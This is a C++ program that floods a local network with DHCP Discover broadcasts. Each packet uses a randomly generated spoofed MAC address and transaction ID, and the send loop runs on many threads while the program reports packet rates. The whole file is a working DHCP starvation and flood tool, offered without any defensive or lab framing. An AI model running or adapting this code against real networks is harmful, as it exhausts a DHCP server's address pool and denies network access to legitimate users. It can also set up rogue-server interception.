

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <vector>
#include <atomic>
#include <random>
#include <array>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iomanip>



// Defines DHCP Packet Structure
#pragma pack(push, 1)
struct DHCP {
    // Operation Code
    uint8_t op;
    // Hardware Type
    uint8_t htype;
    // Hardware Length
    uint8_t hlen;
    // Hop Count
    uint8_t hops;
    // Transition ID
    uint32_t xid;
    // Number of Seconds
    uint16_t secs;
    // Flags
    uint16_t flags;
    // CLient IP address
    uint32_t ciaddr;
    // Your IP address
    uint32_t yiaddr;
    // Server IP address
    uint32_t siaddr;
    // Gateway IP address
    uint32_t giaddr;
    // Client hardware address (16 byte)
    uint8_t chaddr[16];
    // Server name (64 byte)
    char sname[64];
    // Boot file name (128 byte)
    char file[128];
    // Option (variable length)
    uint8_t options[240];
};
#pragma pack(pop)


// Packet Pool Definition
// Defines a constant size for the packet pool of 1024
constexpr size_t PACKET_POOL_SIZE = 1024;
// Pre-allocated pool of DHCP packets to avoid frequent memory allocations
std::array<DHCP, PACKET_POOL_SIZE> packet_pool;
// Atomic counter for tracking packets
std::atomic<uint64_t> packets_sent_last_second(0);
// atomic Boolean Flag for when program should stop (initialized to 'false'; progam keeps running)
std::atomic<bool> should_exit(false);



// Generate random mac addresses
void generate_random_mac(uint8_t* mac) {
    // Random number generator
    static thread_local std::mt19937 gen(std::random_device{}());
    static std::uniform_int_distribution<> dis(0, 255);

    // First 3 bytes are hardcoded to mimic specific manufacturer's MAC address prefix (QEMU/KVM?)
    mac[0] = 0x52;
    mac[1] = 0x54;
    mac[2] = 0x00;
    // Generates a random byte but ensures the first bit is 0 (avoiding multicast MAC addresses).
    mac[3] = dis(gen) & 0x7F;
    // Generates a fully randomized byte 
    mac[4] = dis(gen);
    mac[5] = dis(gen);
}


// Loops through the pool and initializes each packet with DHCP Discover or Request values.
void initialize_packet_pool() {
    for (auto& packet : packet_pool) {
        packet.op = 1;  // Client request for IP address
        packet.htype = 1;  // Ethernet (MAC-based addressing)
        packet.hlen = 6;  // MAC address length
        packet.hops = 0; 
        packet.secs = 0;
        packet.flags = htons(0x8000);  // Broadcast
        packet.ciaddr = 0;
        packet.yiaddr = 0;
        packet.siaddr = 0;
        packet.giaddr = 0;

        generate_random_mac(packet.chaddr);

        // DHCP Discover options
        packet.options[0] = 53;  // DHCP Message Type
        packet.options[1] = 1;   // Length
        packet.options[2] = 1;   // Discover
        packet.options[3] = 255; // End option

        // Randomize XID
        packet.xid = rand();
    }
}

void send_packets(int thread_id) {
    // Create a UDP socket
    // Uses AF_INET - IPv4 networking
    // Uses SOCK_DGRAM - UDP protocol (required for DHCP)
    // Uses 0 - Default protocol selection (UDP)
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    //Check if Socket Creation Failed
    if (sock < 0) {
        perror("Failed to create socket");
        return;
    }

    // Enable broadcast mode
    // setsockopt() - sets socket options
    // SO_BROADCAST - Allows the socket to send broadcast packets
    // &broadcast = 1 - Enables broadcasting
    // sizeof(broadcast) - Specifies the option size
    int broadcast = 1;
    // Why Does DHCP Need Broadcast?
    // When a client does not have an IP address, it cannot send packets to a specific server
    // Instead, DHCP Discover messages are sent to 255.255.255.255 (broadcast)
    // Enabling SO_BROADCAST is necessary so the system allows sending to this address

    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0) {
        perror("Failed to set SO_BROADCAST");
        close(sock);
        return;
    }


    struct sockaddr_in addr;
    // Declares addr as a sockaddr_in structure, which stores the target network address for sending packets.
    memset(&addr, 0, sizeof(addr));
    // Sets sin_family to AF_INET, meaning IPv4 addressing will be used.
    addr.sin_family = AF_INET;
    // htons(67) converts port 67 to network byte order
    addr.sin_port = htons(67);
    // INADDR_BROADCAST is a special constant that represents the broadcast IP address (255.255.255.255)
    addr.sin_addr.s_addr = INADDR_BROADCAST;



    // Track the number of packets sent by this thread
    uint64_t local_counter = 0;
    // This assigns each thread a unique starting packet from the pool, helping distribute work
    size_t packet_index = thread_id % PACKET_POOL_SIZE;

    while (!should_exit.load(std::memory_order_relaxed)) {
        // Selects a packet from the pool (based on packet_index)
        DHCP& packet = packet_pool[packet_index];
        
        // Update MAC and XID every 1000 packets for some variability
        if (local_counter % 1000 == 0) {
            generate_random_mac(packet.chaddr);
            // Ensures each packet looks different to the DHCP server
            packet.xid = rand();
        }



    // Uses sendto() to send the packet via UDP broadcast:
        // sock → UDP socket.
        // &packet → Pointer to the DHCP packet.
        // sizeof(DHCP) → Size of the packet.
        // 0 → No special flags.
        // (struct sockaddr*)&addr → Target broadcast address.
        // Sizeof(addr) → Size of the address structure.
        if (sendto(sock, &packet, sizeof(DHCP), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("Failed to send packet");
        } else {
            local_counter++;
        }

        // Moves to the next packet in the pool
        packet_index = (packet_index + 1) % PACKET_POOL_SIZE;
        // Every 10,000 packets, updates packets_sent_last_second atomically.
        if (local_counter % 10000 == 0) {  // Update less frequently to reduce atomic operations
            packets_sent_last_second.fetch_add(local_counter, std::memory_order_relaxed);
            local_counter = 0;
        }
    }

    close(sock);
}


// Performance metrics: current packet rate, avg packets per second - prints to console
void display_count() {
    uint64_t total_packets = 0;
    auto start_time = std::chrono::steady_clock::now();

    while (!should_exit.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto current_time = std::chrono::steady_clock::now();
        uint64_t packets_this_second = packets_sent_last_second.exchange(0, std::memory_order_relaxed);
        total_packets += packets_this_second;

        double elapsed_time = std::chrono::duration<double>(current_time - start_time).count();
        double rate = packets_this_second;
        double avg_rate = total_packets / elapsed_time;

        std::cout << "Packets sent: " << total_packets 
                  << ", Rate: " << std::fixed << std::setprecision(2) << rate << " pps"
                  << ", Avg: " << std::fixed << std::setprecision(2) << avg_rate << " pps" << std::endl;
    }
}

int main() {
    // Ensures random values for DHCP transaction IDs (XID) and MAC addresses
    // Without this, the program would generate the same random values every time it runs
    srand(time(nullptr));
    initialize_packet_pool();

    unsigned int num_threads = std::thread::hardware_concurrency() * 2;
    std::vector<std::thread> threads;

    for (unsigned int i = 0; i < num_threads; i++) {
        threads.emplace_back(send_packets, i);
    }

    std::thread display_thread(display_count);

    std::cout << "Press Enter to stop..." << std::endl;

    std::cin.get();

    should_exit.store(true, std::memory_order_relaxed);

    for (auto& t : threads) {
        t.join();
    }
    display_thread.join();

    return 0;
}
